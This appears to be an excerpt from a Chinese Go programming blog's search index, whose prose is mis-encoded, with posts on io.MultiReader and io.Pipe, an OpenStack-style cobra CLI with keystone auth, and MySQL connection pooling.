ç›´åˆ°æ‰€æœ‰readerè¯»å–åŽè¿”å›žEOFåœæ­¢ for n, err := 0, error(nil); err != io.EOF; &#123; tmp := make([]byte, 512) n, err = reader.Read(tmp) data = append(data, tmp[:n]...) &#125; fmt.Printf("%s", data)&#125; åƒä¸Šé¢è¿™æ ·ä½¿ç”¨æ˜¾ç„¶æœ‰ç‚¹éº»çƒ¦, æ¯”è¾ƒæ–¹ä¾¿çš„ä½¿ç”¨æ–¹å¼è¿˜æ˜¯èšåˆè¿‡åŽç›´æŽ¥ä½¿ç”¨io.Copyæ¥æžå®š12345678910111213141516171819package mainimport ( "bytes" "io" "os" "strings")func main() &#123; readers := []io.Reader&#123; strings.NewReader("from strings reader\n"), bytes.NewBufferString("from bytes buffer\n"), &#125; reader := io.MultiReader(readers...) io.Copy(os.Stdout, reader)&#125; MultiWriter: å’ŒMultiReaderç±»ä¼¼, å°†å¤šä¸ªwriterèšåˆéƒ½ä¸€ä¸ªsliceé‡Œé¢, ç„¶åŽç”¨forå¾ªçŽ¯å†™, å®žé™…ä¸Šå°±æ˜¯å°†å‘è‡ªèº«å†™å…¥çš„æ•°æ®åŒæ­¥å†™å…¥åˆ°æ‰€æœ‰writersä¸­1234567891011121314151617package mainimport ( "io" "os")func main() &#123; // ç›´æŽ¥æ¥2ä¸ªwriter writers := []io.Writer&#123; os.Stdout, os.Stderr, &#125; writer := io.MultiWriter(writers...) writer.Write([]byte("hello,world\n"))&#125; pipe.goæºç åˆ†æžè¯¥æ–‡ä»¶ä¸»è¦å®šä¹‰äº†æµå¼IOçš„ç›¸å…³è§„èŒƒ,ä¸»è¦å°±æ˜¯Pipe, Pipeåœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªåŒæ­¥ç®¡é“ï¼Œç”¨äºŽä¸åŒåŒºåŸŸçš„ä»£ç ä¹‹é—´ç›¸äº’ä¼ é€’æ•°æ®, å› æ­¤å’Œæ— ç¼“å†²channelå¾ˆåƒï¼Œå› æ­¤ä¸èƒ½åœ¨ä¸€ä¸ªgoroutineä¸­è¿›è¡Œè¯»å’Œå†™ã€‚åŒæ · ç”±äºŽç®¡é“æ²¡æœ‰ç¼“å­˜åŒº, æ‰€ä»¥å’Œchannelä¸€æ · å¯¹äºŽè¯»å†™å’Œå…³é—­éƒ½æ˜¯ å¹¶è¡Œå®‰å…¨çš„ã€‚123456789101112131415161718192021222324252627// A pipe is the shared pipe structure underlying PipeReader and PipeWriter.type pipe struct &#123; rl sync.Mutex // gates readers one at a time wl sync.Mutex // gates writers one at a time l sync.Mutex // protects remaining fields data []byte // data remaining in pending write rwait sync.Cond // waiting reader wwait sync.Cond // waiting writer rerr error // if reader closed, error to give writes werr error // if writer closed, error to give reads&#125;// A PipeReader is the read half of a pipe.type PipeReader struct &#123; p *pipe&#125;// A PipeWriter is the write half of a pipe.type PipeWriter struct &#123; p *pipe&#125;func Pipe() (*PipeReader, *PipeWriter) &#123; p := new(pipe) p.rwait.L = &amp;p.l p.wwait.L = &amp;p.l r := &amp;PipeReader&#123;p&#125; w := &amp;PipeWriter&#123;p&#125; return r, w&#125; PipeReader: æ˜¯ç®¡é“çš„è¯»å–ç«¯ã€‚å®ƒå®žçŽ°äº†io.Readerå’Œio.CloseræŽ¥å£ï¼Œå¦‚æžœç®¡é“è¢«å…³é—­ï¼Œåˆ™ä¼šè¿”ä¼šä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼š å¦‚æžœå†™å…¥ç«¯é€šè¿‡ CloseWithError æ–¹æ³•å…³é—­äº†ç®¡é“ï¼Œåˆ™è¿”å›žå…³é—­æ—¶ä¼ å…¥çš„é”™è¯¯ä¿¡æ¯ã€‚ å¦‚æžœå†™å…¥ç«¯é€šè¿‡ Close æ–¹æ³•å…³é—­äº†ç®¡é“ï¼Œåˆ™è¿”å›ž io.EOFã€‚ å¦‚æžœæ˜¯è¯»å–ç«¯å…³é—­äº†ç®¡é“ï¼Œåˆ™è¿”å›ž io.ErrClosedPipeã€‚ PipeWriter: æ˜¯ç®¡é“çš„å†™å…¥ç«¯ã€‚å®ƒå®žçŽ°äº†io.Writerå’Œio.CloseræŽ¥å£, å¦‚æžœç®¡é“è¢«å…³é—­ï¼Œåˆ™ä¼šè¿”ä¼šä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼š å¦‚æžœè¯»å–ç«¯é€šè¿‡ CloseWithError æ–¹æ³•å…³é—­äº†ç®¡é“ï¼Œåˆ™è¿”å›žå…³é—­æ—¶ä¼ å…¥çš„é”™è¯¯ä¿¡æ¯ã€‚ å¦‚æžœè¯»å–ç«¯é€šè¿‡ Close æ–¹æ³•å…³é—­äº†ç®¡é“ï¼Œåˆ™è¿”å›ž io.ErrClosedPipeã€‚ å¦‚æžœæ˜¯å†™å…¥ç«¯å…³é—­äº†ç®¡é“ï¼Œåˆ™è¿”å›ž io.ErrClosedPipeã€‚ Pipe: å®ƒå°†io.Readerè¿žæŽ¥åˆ°io.Writerã€‚ä¸€ç«¯çš„è¯»å–åŒ¹é…å¦ä¸€ç«¯çš„å†™å…¥ï¼Œç›´æŽ¥åœ¨è¿™ä¸¤ç«¯ä¹‹é—´å¤åˆ¶æ•°æ® 123456789101112131415161718192021222324252627282930313233343536373839404142434445package mainimport ( "fmt" "io" "log" "time")func main() &#123; Pipe()&#125;func Pipe() &#123; rPipe, wPipe := io.Pipe() go Read(rPipe) Write(wPipe) time.Sleep(2 * time.Second)&#125;func Write(pipeWriter *io.PipeWriter) &#123; _, err := pipeWriter.Write([]byte("Pipe ç®¡é“æµ‹è¯•")) if err != nil &#123; log.Fatal(err) &#125; // è®°å¾—å†™å…¥ç«¯å…³é—­Pipe pipeWriter.CloseWithError(io.EOF) fmt.Println("å†™å…¥å®Œæˆ")&#125;func Read(pipeReader *io.PipeReader) &#123; data := make([]byte, 1024) for n, err := 0, error(nil); err != io.EOF; &#123; tmp := make([]byte, 512) n, err = pipeReader.Read(tmp) if err != nil &amp;&amp; err != io.EOF &#123; log.Fatal(err) &#125; data = append(data, tmp[:n]...) &#125; fmt.Println("Data: ", string(data))&#125;]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>io</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Golangå¼€å‘OpenStackæœåŠ¡çš„CLI]]></title>
    <url>%2F2017%2F04%2F23%2Fopenstack-golang-cli%2F</url>
    <content type="text"><![CDATA[ç”±äºŽæˆ‘ä»¬éœ€è¦ç¼–å†™è‡ªå·±æœåŠ¡çš„å®¢æˆ·ç«¯ï¼Œä¹‹å‰å‚è€ƒè¿‡magnumçš„pythonå®¢æˆ·ç«¯ï¼Œç¼–å†™è¿‡ä¸€ä¸ªï¼Œæ•´ä½“æ„Ÿå—å°±æ˜¯: ä¸€ä»¶ç®€å•çš„äº‹å„¿ï¼Œè¢«ä»–å°è£…çš„å¾ˆå¤æ‚ï¼Œè€Œä¸”è¿˜æœ‰ä¸€ä¸ªå…³é”®ç—›ç‚¹ï¼Œéƒ¨ç½²é—®é¢˜: 1.ä¾èµ–pythonçŽ¯å¢ƒ 2. è¹©è„šçš„äºŒè¿›åˆ¶æ‰“åŒ…æ–¹å¼ã€‚ å› æ­¤ï¼Œä½œä¸ºä¸€ä¸ªäº§å“çš„CLIï¼Œä»¥äºŒè¿›åˆ¶æ–¹å¼äº¤ä»˜ä¼šå¸¦æ¥è¯¸å¤šæ–¹ä¾¿ï¼Œæ¯”å¦‚cloud foundryä¹Ÿç”¨golangé‡å†™äº†ä»–çš„å®¢æˆ·ç«¯éƒ¨åˆ†ã€‚ Cobraç®€ä»‹åœ¨åšå®¢çš„å¼€ç¯‡å†™è¿‡ä¸€ç¯‡cobraçš„åšå®¢: å¦‚ä½•ä½¿ç”¨golangç¼–å†™æ¼‚äº®çš„å‘½ä»¤è¡Œå·¥å…·, å¾ˆå¤šæµè¡Œçš„CLIéƒ½åŸºäºŽè¿™ä¸ªåº“å¼€å‘ï¼Œæ¯”å¦‚kubectl, etcdctl, dockerç­‰, åŸºæœ¬çš„æ¦‚å¿µå’Œç”¨æ³•è¯·å‚è€ƒä¹‹å‰çš„åšå®¢ã€‚ä¸å–œæ¬¢æˆ‘å•°å—¦çš„ï¼Œç›´æŽ¥çœ‹æºç :å®Œæ•´ä»£ç ç¤ºä¾‹ åŸºäºŽRESTfulçš„CLIæ‰“é€ çš„è¿™ä¸ªCLIæ˜¯RESTfulçš„å®¢æˆ·ç«¯, åœ¨RESTfulé‡Œé¢ä»¥èµ„æº(Resource)ä¸ºæ ¸å¿ƒï¼Œå› æ­¤å®¢æˆ·ç«¯ä¹Ÿéœ€è¦ä»¥èµ„æºçš„å½¢å¼è¡¨çŽ°, æ¯”å¦‚Dockerçš„ Management Commands:12345678910111213Management Commands: checkpoint Manage checkpoints container Manage containers image Manage images network Manage networks node Manage Swarm nodes plugin Manage plugins secret Manage Docker secrets service Manage services stack Manage Docker stacks swarm Manage Swarm system Manage Docker volume Manage volumes è¯¥èµ„æºå…è®¸çš„æ“ä½œ:1234567891011121314151617181920212223âžœ uniresctl git:(dev_maojun) docker image -hFlag shorthand -h has been deprecated, please use --helpUsage: docker image COMMANDManage imagesOptions: --help Print usageCommands: build Build an image from a Dockerfile history Show the history of an image import Import the contents from a tarball to create a filesystem image inspect Display detailed information on one or more images load Load an image from a tar archive or STDIN ls List images prune Remove unused images pull Pull an image or a repository from a registry push Push an image or a repository to a registry rm Remove one or more images save Save one or more images to a tar archive (streamed to STDOUT by default) tag Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE å› æ­¤, è½®å»“ä¸Šæˆ‘ä»¬éœ€è¦æ‰“é€ è¿™æ ·ä¸€ç§é£Žæ ¼çš„RESTful CLI OpenStackæœåŠ¡ CLIæˆ‘ä»¬çš„OpenStackæœåŠ¡æ˜¯è‡ªå·±å¼€å‘çš„, å¼€å‘å‡ºæ¥çš„CLIé£Žæ ¼æƒ³è¦å’ŒOpenstackç¤¾åŒºé£Žæ ¼ä¸€è‡´(é•¿ç›¸ç›¸è¿‘), è¿™ä¸œè¥¿ç¤¾åŒºæ˜¯æ²¡æœ‰Golangç‰ˆæœ¬çš„(æœ‰çš„è¯ç»™æˆ‘ç•™è¨€, æˆ‘çœŸæ²¡æ‰¾åˆ°), å› æ­¤æ•´ä¸ªæž¶å­éœ€è¦è‡ªå·±æž„å»º, ç”±äºŽcobraæž¶å­æ¯”è¾ƒæˆç†Ÿ, å¦‚æžœåªç”¨å®˜æ–¹çš„Flagåº“æ¥åšçš„è¯ï¼Œä¼šæœ‰å¾ˆå¤šé‡å¤å·¥ä½œ, å› æ­¤ä½¿ç”¨cobraä¸ºåŸºç¡€æ¥è¿›è¡Œæž„å»ºã€‚ è¦åšæˆå’ŒOpenstacké£Žæ ¼ç±»ä¼¼çš„CLI, åœ¨cobraçš„åŸºç¡€ä¸Šæˆ‘ä»¬éœ€è¦åŠ å…¥2ä¸ªç»„ä»¶: keystoneè®¤è¯: å¯¹æ¯ä¸€ä¸ªèµ„æºçš„è®¿é—®å¿…é¡»é€šè¿‡keystoneè®¤è¯æ‰èƒ½è®¿é—®, å› æ­¤è®¤è¯éƒ¨åˆ†æ˜¯å…¨å±€çš„ã€‚ è¡¨æ ¼è¾“å‡º: OpenstackCLIæŠŠèµ„æºä»¥Tableçš„æ–¹å¼è¾“å‡º, è¿™ä¸ªä¹Ÿéœ€è¦å•ç‹¬å®žçŽ°ã€‚ æ­å»ºCLIæž¶å­ å®Œæ•´ä»£ç çš„æ —å­è¯·çœ‹Github: å®Œæ•´ä»£ç ç¤ºä¾‹ åˆå§‹åŒ–app, æ·»åŠ resourceAå’ŒresourceB123cobra init app-clicobra add resourceAcobra add resourceB è®¿é—®æ¯ä¸€ä¸ªresourceéƒ½éœ€è¦ç»è¿‡keystoneçš„è®¤è¯,å› æ­¤è®¤è¯å±žäºŽä¸€ä¸ªå…¨å±€éƒ½è¦æ‰§è¡Œçš„é€»è¾‘, å¿…é¡»æ”¾åœ¨æœ€å‰é¢ï¼Œè¿™é‡ŒCobraæä¾›çš„ä¸€ç»„Hookå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ å¸¦é”™è¯¯å¤„ç†çš„Hookå½“å¤„ç†è¿‡ç¨‹ä¸­å¦‚æžœäº§ç”Ÿäº†errorå¯ä»¥ç›´æŽ¥returnå‡ºæ¥, ä»Žè€Œä¸­æ–­å‘½ä»¤çš„ç»§ç»­æ‰§è¡Œ, å› æ­¤è®¤è¯éƒ¨åˆ†æˆ‘ä»¬éœ€è¦è¿™ç§å¸¦é”™è¯¯å¤„ç†çš„Hook, å› ä¸ºè®¤è¯å¤±è´¥éœ€è¦ä¸­æ–­è¯·æ±‚,å…¶æ¬¡ï¼Œcobra åœ¨å‘½ä»¤å‡½æ•°çš„æ‰§è¡Œå‰åŽåˆ†åˆ«è®¾ç½®äº†2ç»„Hook, æ‰§è¡Œçš„é¡ºåºå¦‚ä¸‹: PersistentPreRunE: æ— è®ºå‡½æ•° æ‰§ä¸æ‰§è¡Œ è¯¥å‡½æ•°éƒ½ä¼šè¿è¡Œ PreRunE: åœ¨å‡½æ•°æ‰§è¡Œå‰æ‰§è¡Œ RunE: æ‰§è¡Œå‡½æ•° PostRunE: å‡½æ•°æ‰§è¡ŒåŽæ‰§è¡Œ PersistentPostRunE: æ— è®ºå‡½æ•° æ‰§ä¸æ‰§è¡Œ è¯¥å‡½æ•°éƒ½ä¼šæ‰§è¡Œ åˆ©ç”¨cobraæä¾›çš„PersistentPreRunEæ¥å®žçŽ°éªŒè¯åŠŸèƒ½123456789101112// RootCmd represents the base command when called without any subcommandsvar RootCmd = &amp;cobra.Command&#123; Use: "app-cli", Short: "A brief description of your application", Long: `A longer description that spans multiple lines and likely containsexamples and usage of using your application. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.`, PersistentPreRunE: auth,&#125; authå‡½æ•°å®žçŽ°è®¤è¯å¹¶ä¸éš¾, å…³é”®æ˜¯authè¿‡åŽçš„token å¦‚ä½•ä¼ é€’ç»™åŽé¢çš„å­å‘½ä»¤ä½¿ç”¨, å‚è€ƒetcdctlå’Œdockeréƒ¨åˆ†éƒ½ä½¿ç”¨ä¸Šä¸‹æ–‡æ¥å®žçŽ°è¿™ä¸ªéœ€æ±‚, cobraé‡Œé¢ä¹Ÿæ²¡æœ‰åœ°æ–¹ç»™æˆ‘å­˜ä¸Šä¸‹æ–‡, å› æ­¤éœ€è¦ä¸“é—¨ç”¨ä¸€ä¸ªæ¨¡å—æ¥ä¿æŒ å…¨å±€çš„ä¸Šä¸‹æ–‡, å› æ­¤éœ€è¦æ‰‹åŠ¨å®žçŽ°ä¸€ä¸ªcommonåŒ…ã€‚123456789101112131415161718192021222324252627282930313233343536package common// GlobalFlag use to contain the all contextvar GlobalFlag *globalFlagtype globalFlag struct &#123; endpoint string token string&#125;func (g *globalFlag) SetToken(token string) &#123; g.token = token&#125;func (g *globalFlag) GetToken() string &#123; return g.token&#125;func (g *globalFlag) SetEndPoint(url string) &#123; g.endpoint = url&#125;func (g *globalFlag) GetEndPoint() string &#123; return g.endpoint&#125;func (g *globalFlag) GetClient() *Client &#123; client, _ := NewClient(g.endpoint, g.token) return client&#125;func init() &#123; if GlobalFlag == nil &#123; GlobalFlag = &amp;globalFlag&#123;&#125; &#125;&#125; æœ€åŽåœ¨commonåŒ…é‡Œé¢æ·»åŠ 2ä¸ªå­åŒ…: keystone, printTable, keystone ç”¨äºŽå®žçŽ°ä¸Žkeystoneè®¤è¯çš„è¿‡ç¨‹, printTableç”¨äºŽæ‰“å°æœ€åŽç»“æžœçš„è¡¨æ ¼,å…·ä½“è¯¦æƒ…è¯·çœ‹æºç ã€‚ æ·»åŠ èµ„æºä¸ºæ¯ä¸€ä¸ªèµ„æºæ·»åŠ 5ä¸ªåŸºç¡€çš„æ“ä½œ:get, list, create, delete, updateã€‚å¦èµ·ä¸€ä¸ªresourceAçš„åŒ…ï¼Œå®žçŽ°è¿™äº›æ–¹æ³•ï¼Œæ·»åŠ åˆ°å­å‘½ä»¤å³å¯ï¼Œ æ¯”å¦‚:123456789func init() &#123; RootCmd.AddCommand(resourceACmd) resourceACmd.AddCommand(resourceA.CreateCmd, resourceA.ListCmd, resourceA.GetCmd, resourceA.UpdateCmd, resourceA.DeleteCmd)&#125; å¤§æ¦‚æ•ˆæžœå¦‚ä¸‹123456789101112131415161718192021222324252627282930âžœ app-cli git:(master) âœ— go run main.go resourceA -hA longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: app-cli resourceA [flags] app-cli resourceA [command]Available Commands: create create an resource delete delete an resource get get an resource list list resources update update an resourceGlobal Flags: --api-endpoint string unires service endpoint --auth_url string keyston auth url --idenntity-api-version string keystone auth version --password string keystone auth user password --project-domain-name string keystone auth user project domain --project-name string keystone auth user project name --user-domain-name string keystone auth user domain name --username string keystone auth userUse "app-cli resourceA [command] --help" for more information about a command. ä½¿ç”¨æ•ˆæžœå’Œä½¿ç”¨openstackä¸€æ ·ï¼Œä½ éœ€è¦æœ‰ä¸€ä¸ªadmin_openrc ç”¨äºŽå¯¼å…¥çŽ¯å¢ƒå˜é‡12345678export OS_USERNAME=adminexport OS_PASSWORD=adminexport OS_PROJECT_NAME=admin.cloudexport OS_USER_DOMAIN_NAME=adminexport OS_PROJECT_DOMAIN_NAME=adminexport OS_AUTH_URL=http://127.0.0.1:35357/v3export OS_IDENTITY_API_VERSION=3export UNIRES_ENDPOINT=http://127.0.0.1:8080 æ¯”å¦‚12source admin_openrc./app-cli resourceA get]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>openstack</tag>
        <tag>cobra</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golangä¸­mysqlè¿žæŽ¥æ± ä½¿ç”¨]]></title>
    <url>%2F2017%2F04%2F05%2Fgolang-mysql-connection-pool%2F</url>
    <content type="text"><![CDATA[åœ¨ä½¿ç”¨golangæ¥å¤„ç†æ•°æ®åº“çš„æ—¶å€™ï¼Œä¸ºäº†æå‡æ€§èƒ½ï¼Œå¾€å¾€éƒ½ä¼šä½¿ç”¨è¿žæŽ¥æ± ï¼Œæœ‰äº›äººå¾€å¾€ä¼šè‡ªå·±å®žçŽ°ä¸€ä¸ªè¿žæŽ¥æ± ï¼Œç”¨æ¥äº’ç”¨mysqlè¿žæŽ¥ï¼Œä½†æ˜¯å¦‚æžœä½ ç¨å¾®ç»†å¿ƒä¸€ç‚¹ï¼Œ å°±ä¼šå‘çŽ°å†…å»ºçš„sqlåŒ…å·²ç»å®žçŽ°äº†è¿žæŽ¥æ± ã€‚sql.Openå‡½æ•°å®žé™…ä¸Šå¼è¿”å›žä¸€ä¸ªè¿žæŽ¥æ± å¯¹è±¡ï¼Œè€Œä¸æ˜¯å•ä¸ªè¿žæŽ¥ã€‚ golangæœ¬èº«æ²¡æœ‰æä¾›é“¾æŽ¥mysqlçš„é©±åŠ¨ï¼Œä½†æ˜¯å´å®šä¹‰äº†æ•°æ®åº“çš„æ ‡å‡†æŽ¥å£(å†…å»ºçš„sqlåŒ…), ç¬¬ä¸‰æ–¹å¼€å‘å®žçŽ°è¿™äº›æŽ¥å£å°±å®Œæˆäº†ç›¸åº”é©±åŠ¨çš„å¼€å‘ã€‚ç¬¬ä¸‰æ–¹æä¾›mysqlçš„é©±åŠ¨æ¯”è¾ƒå¤šï¼Œéµå¾ªå®˜æ–¹sqlæŽ¥å£è§„èŒƒçš„ä¹Ÿæœ‰å¥½å‡ ä¸ª, ä½†æ˜¯ä½¿ç”¨æœ€å¹¿çš„,githubä¸Šæ˜Ÿæœ€å¤šåº”è¯¥æ˜¯https://github.com/go-sql-driver/mysql, ä»¥ä¸‹çš„æ‰€æœ‰æ“ä½œéƒ½ä»¥è¯¥é©±åŠ¨è¿›è¡Œæ¼”ç¤ºã€‚ æ•°æ®åº“çš„åŸºæœ¬æ“ä½œè¿™é‡Œä¸»è¦ä»‹ç»æ•°æ®åº“æ“ä½œä¸­ä¸€äº›å¸¸è§æ“ä½œï¼Œæ¯”å¦‚å»ºè¡¨ï¼Œä»¥åŠæ•°æ®çš„å¢žåˆ æ”¹æŸ¥ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€å¼ è¡¨ï¼Œç”¨äºŽå­˜å‚¨æ•°æ®, æˆ‘ä»¬å¯ä»¥é€šè¿‡dbçš„Execæ¥æ‰§è¡ŒSQLè¯­å¥ï¼Œæ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ›å»ºè¡¨çš„å‡½æ•°:123456789101112131415161718192021func createTable() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) table := `CREATE TABLE IF NOT EXISTS test.user ( user_id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT 'ç”¨æˆ·ç¼–å·', user_name VARCHAR(45) NOT NULL COMMENT 'ç”¨æˆ·åç§°', user_age TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT 'ç”¨æˆ·å¹´é¾„', user_sex TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT 'ç”¨æˆ·æ€§åˆ«', PRIMARY KEY (user_id)) ENGINE = InnoDB AUTO_INCREMENT = 1 DEFAULT CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'ç”¨æˆ·è¡¨'` if _, err := db.Exec(table); err != nil &#123; checkErr(err) &#125;&#125; æœ‰äº†è¡¨è¿‡åŽï¼Œæˆ‘ä»¬éœ€è¦æ’å…¥æ•°æ®, ç†è®ºä¸Šå¯ä»¥å°†æ’å…¥çš„SQLè¯­å¥å‡†å¤‡å¥½, å¡«å…¥Execå³å¯ï¼Œä½†æ˜¯sqlå·²ç»å¯¹è¿™ç§å¸¸ç”¨çš„åœºæ™¯æŠ½è±¡å‡ºäº†ä¸€ä¸ªPrepareæ–¹æ³•ï¼ŒPrepareæ–¹æ³•å°†SQLçš„é€»è¾‘å’Œæ•°æ®å‰¥ç¦»å¼€æ¥ï¼Œé€šè¿‡å ä½ç¬¦æ¥ç”Ÿæˆä¸€ä¸ªSQLè¡¨è¾¾å¼(statement),ç„¶åŽè¡¨è¾¾å¼æ‰§è¡Œæ—¶ï¼Œä¼ å…¥å…·ä½“çš„éœ€è¦æ’å…¥çš„æ•°æ®:123456789101112func insert() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) res, err := stmt.Exec("tony", 20, 1) checkErr(err) id, err := res.LastInsertId() checkErr(err) fmt.Println(id)&#125; æ’å…¥æ•°æ®è¿‡ä¼šæˆ‘ä»¬å°±å¯ä»¥ï¼Œä»Žä¸­æŸ¥è¯¢æ•°æ®è®°å½•äº†ï¼ŒæŸ¥è¯¢å‡ºæ¥çš„æ•°æ®ä»¥è¡Œä¸ºå•ä½è¿›è¡Œç»„ç»‡ï¼ˆRows)ï¼Œ RowåŒ…å«å­—æ®µå’Œå€¼ï¼Œé€šè¿‡rows.Columns()èŽ·å–å­—æ®µï¼Œé€šè¿‡rows.Next()èŽ·å–å€¼ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„Next()è¿™ä¸ªæ–¹æ³•ï¼Œå®ƒå’Œpythoné‡Œé¢çš„ç”Ÿæˆå™¨æ¦‚è¦å¾ˆåƒï¼ŒNextè¿”å›žä¸€ä¸ªboolå€¼ï¼Œè¡¨ç¤ºæ˜¯å¦æœ‰æ–°çš„rowæ•°æ®å‡†å¤‡å¥½äº†ï¼Œå¦‚æžœå‡†å¤‡å¥½äº†ï¼Œä½¿ç”¨rows.Scan()æ¥èŽ·å–å‡†å¤‡å¥½çš„æ•°æ®1234567891011121314151617181920212223func query() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) rows, err := db.Query("SELECT * FROM user") checkErr(err) for rows.Next() &#123; var userId int var userName string var userAge int var userSex int rows.Columns() err = rows.Scan(&amp;userId, &amp;userName, &amp;userAge, &amp;userSex) checkErr(err) fmt.Println(userId) fmt.Println(userName) fmt.Println(userAge) fmt.Println(userSex) &#125;&#125; è¿™æ ·æ‰«ææˆ‘ä»¬çš„ç¡®èƒ½èŽ·å–åˆ°æ•°æ®ï¼Œä½†æ˜¯æ•°æ®å¹¶æ²¡æœ‰è¢«å‹å¥½çš„ç»„ç»‡èµ·æ¥ï¼Œåœ¨pythonçš„mysqlé©±åŠ¨ä¸­æä¾›ä¸€ä¸ªç®€å•æ–¹æ³•å¯ä»¥å°†è¿™äº›è¡Œæ•°æ®ç»„ç»‡æˆä¸€ä¸ªdictè¿”å›žï¼Œå› æ­¤åœ¨golangä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†rowsçš„æ•°æ®ç»„ç»‡æˆä¸€ä¸ªmapè¿”å›žï¼Œæ–¹ä¾¿ä½¿ç”¨ã€‚12345678910111213141516171819202122232425262728func queryToMap() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) rows, err := db.Query("SELECT * FROM user") checkErr(err) //å­—å…¸ç±»åž‹ //æž„é€ scanArgsã€valuesä¸¤ä¸ªæ•°ç»„ï¼ŒscanArgsçš„æ¯ä¸ªå€¼æŒ‡å‘valuesç›¸åº”å€¼çš„åœ°å€ columns, _ := rows.Columns() scanArgs := make([]interface&#123;&#125;, len(columns)) values := make([]interface&#123;&#125;, len(columns)) for i := range values &#123; scanArgs[i] = &amp;values[i] &#125; for rows.Next() &#123; //å°†è¡Œæ•°æ®ä¿å­˜åˆ°recordå­—å…¸ err = rows.Scan(scanArgs...) record := make(map[string]string) for i, col := range values &#123; if col != nil &#123; record[columns[i]] = string(col.([]byte)) &#125; &#125; fmt.Println(record) &#125;&#125; æŽ¥ä¸‹æ¥æ˜¯æ•°æ®çš„æ›´æ–°, æ›´æ–°å’Œæ•°æ®çš„æ’å…¥åŽŸç†ä¸€è‡´ï¼Œåªæ˜¯åœ¨å‡†å¤‡çš„SQLé‡Œé¢é€šè¿‡WHEREæŒ‡å®šæ¡ä»¶ï¼Œä»¥æ›´æ–°æŒ‡å®šçš„æ•°æ®è®°å½•ã€‚123456789101112func update() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`UPDATE user SET user_age=?,user_sex=? WHERE user_id=?`) checkErr(err) res, err := stmt.Exec(21, 2, 1) checkErr(err) num, err := res.RowsAffected() checkErr(err) fmt.Println(num)&#125; æœ€åŽæ˜¯æ•°æ®çš„åˆ é™¤ï¼ŒåŒç†123456789101112func remove() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`DELETE FROM user WHERE user_id=?`) checkErr(err) res, err := stmt.Exec(1) checkErr(err) num, err := res.RowsAffected() checkErr(err) fmt.Println(num)&#125; å¦‚ä½•è®¾ç½®è¿žæŽ¥æ± æ•°æ®åº“æ ‡å‡†æŽ¥å£é‡Œé¢æœ‰3ä¸ªæ–¹æ³•ç”¨äºŽè®¾ç½®è¿žæŽ¥æ± çš„å±žæ€§: SetConnMaxLifetime, SetMaxIdleConns, SetMaxOpenConns SetConnMaxLifetime: è®¾ç½®ä¸€ä¸ªè¿žæŽ¥çš„æœ€é•¿ç”Ÿå‘½å‘¨æœŸï¼Œå› ä¸ºæ•°æ®åº“æœ¬èº«å¯¹è¿žæŽ¥æœ‰ä¸€ä¸ªè¶…æ—¶æ—¶é—´çš„è®¾ç½®ï¼Œå¦‚æžœè¶…æ—¶æ—¶é—´åˆ°äº†æ•°æ®åº“ä¼šå•æ–¹é¢æ–­æŽ‰è¿žæŽ¥ï¼Œæ­¤æ—¶å†ç”¨è¿žæŽ¥æ± å†…çš„è¿žæŽ¥è¿›è¡Œè®¿é—®å°±ä¼šå‡ºé”™, å› æ­¤è¿™ä¸ªå€¼å¾€å¾€è¦å°äºŽæ•°æ®åº“æœ¬èº«çš„è¿žæŽ¥è¶…æ—¶æ—¶é—´ SetMaxIdleConns: è¿žæŽ¥æ± é‡Œé¢å…è®¸Idelçš„æœ€å¤§è¿žæŽ¥æ•°, è¿™äº›Idelçš„è¿žæŽ¥ å°±æ˜¯å¹¶å‘æ—¶å¯ä»¥åŒæ—¶èŽ·å–çš„è¿žæŽ¥,ä¹Ÿæ˜¯ç”¨å®ŒåŽæ”¾å›žæ± é‡Œé¢çš„äº’ç”¨çš„è¿žæŽ¥, ä»Žè€Œæå‡æ€§èƒ½ã€‚ SetMaxOpenConns: è®¾ç½®æœ€å¤§æ‰“å¼€çš„è¿žæŽ¥æ•°ï¼Œé»˜è®¤å€¼ä¸º0è¡¨ç¤ºä¸é™åˆ¶ã€‚æŽ§åˆ¶åº”ç”¨äºŽæ•°æ®åº“å»ºç«‹è¿žæŽ¥çš„æ•°é‡ï¼Œé¿å…è¿‡å¤šè¿žæŽ¥åŽ‹åž®æ•°æ®åº“ã€‚ ä»£ç ä¸Šä½¿ç”¨å°±å¾ˆç®€å•äº†, åˆå§‹åŒ–dbæ—¶ï¼Œæ ¹æ®éœ€æ±‚è®¾ç½®å¥½è¿žæŽ¥æ± ã€‚123456789var db *sql.DB 